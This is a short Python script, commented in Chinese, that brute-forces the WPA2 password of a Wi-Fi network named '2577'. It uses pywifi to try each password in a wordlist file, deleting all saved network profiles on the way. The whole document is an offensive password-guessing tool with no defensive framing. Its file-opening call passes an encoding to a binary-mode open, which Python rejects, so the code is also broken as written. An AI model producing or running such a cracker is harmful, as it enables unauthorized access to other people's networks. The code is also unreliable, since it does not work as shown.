import mmap
import pywifi
from pywifi import const
import time

class FuckWifi:
    def __init__(self):
        self.process_text_with_mmap('./src/fuck_wifi/wordlist/passlist.txt',self.connect_to_wifi)
    def connect_to_wifi(self, ssid, password):
        # 初始化 WiFi
        wifi = pywifi.PyWiFi()
        
        # 获取第一个无线网卡接口
        iface = wifi.interfaces()[0]
        
        # 断开当前连接
        iface.disconnect()
        time.sleep(1)  # 等待断开完成
        
        # 创建配置文件
        profile = pywifi.Profile()
        profile.ssid = ssid  # WiFi名称
        profile.auth = const.AUTH_ALG_OPEN  # 认证算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  # 加密类型(WPA2)
        profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
        profile.key = password  # WiFi密码
        
        # 移除所有已有配置文件并添加新配置
        iface.remove_all_network_profiles()
        temp_profile = iface.add_network_profile(profile)
        
        # 尝试连接
        iface.connect(temp_profile)
        time.sleep(5)  # 等待连接完成
        
        # 检查连接状态
        if iface.status() == const.IFACE_CONNECTED:
            print(f"成功连接到 {ssid}!")
            return True
        else:
            print(f"连接 {ssid} 失败!")
            return False
    def process_text_with_mmap(self, file_path, process_func):
        with open(file_path, "rb", encoding='utf-8') as f:  # 必须用二进制模式
            # 创建内存映射（只读模式）
            with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) as mm:
                # 逐行读取（返回的是 bytes，需解码）
                for line in iter(mm.readline, b""):
                    decoded_line = line.decode("utf-8").strip()  # 解码 + 去除换行
                    process_func("2577", decoded_line)  # 处理每行

if __name__ == "__main__":
    FuckWifi()